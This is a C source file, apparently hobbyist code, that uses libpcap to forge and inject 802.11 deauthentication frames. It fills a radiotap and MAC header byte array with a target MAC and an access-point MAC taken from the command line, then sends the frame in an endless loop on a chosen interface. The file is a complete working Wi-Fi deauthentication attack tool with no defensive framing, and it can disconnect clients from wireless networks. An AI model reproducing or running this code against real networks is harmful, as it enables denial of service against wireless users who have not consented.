
#include "hacking.h"
#include <pcap/pcap.h>
/* This is the array for building the ieee packets ie deauth and broadcast*/
unsigned char BobTheBuilder[] = {   // byte structure for the packet with a radiotap and mac header
  0x00, 0x00, 0x0C, 0x00,
  0x04, 0x80, 0x00, 0x00, 
  0x02, 0x00, 0x18, 0x00,
	0xC0, 0x00, 0x3A, 0x01,
	0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
	0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,
	0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,
	0x00, 0x00, 0x07, 0x00
};

int main(int argc, unsigned char *argv[])
{
  
  struct pcap_pkthdr * ppcapPacketHeader = NULL;
  unsigned int iMac[6];
  pcap_t *ppcap = NULL;
  char errbuf[PCAP_ERRBUF_SIZE];
  char *device;
  int i, r;
   sscanf(argv[1], "%x:%x:%x:%x:%x:%x", &iMac[0], &iMac[1], &iMac[2], &iMac[3], &iMac[4], &iMac[5]); //converts the charter mac address in to a 6 byte hexadecimal address
  for(i=0;i<6;i++)
    {
      BobTheBuilder[i + 16] = (unsigned char)iMac[i];
    }
   sscanf(argv[2], "%x:%x:%x:%x:%x:%x", &iMac[0], &iMac[1], &iMac[2], &iMac[3], &iMac[4], &iMac[5]);
  for(i=0;i<6;i++)
    {
      BobTheBuilder[i + 22] = (unsigned char)iMac[i];
      BobTheBuilder[i + 30] = (unsigned char)iMac[i];
    }
  device = argv[3];
  dump((const unsigned char *) &BobTheBuilder, sizeof(BobTheBuilder));/*DEBUGGING*/ //used to check that the bytes are all correct and that the packet hasnt been malformed
  errbuf[0] = '\0';
  ppcap = pcap_open_live(device, 800, 1, 20, errbuf); //creates a pcap handle for the specified device
	if (ppcap == NULL)
	{
		printf("Unable to open interface %s in pcap: %s\n",
		    device, errbuf);
		return (1);
	}
	while(1)
	  {
	    	r = pcap_inject(ppcap, BobTheBuilder, sizeof(BobTheBuilder)); //sends the packet over a raw socket using packet injection via the device that the pcap handle points to
		dump((const unsigned char *) &BobTheBuilder, sizeof(BobTheBuilder));/*DEBUGGING*/
	  }

    
}
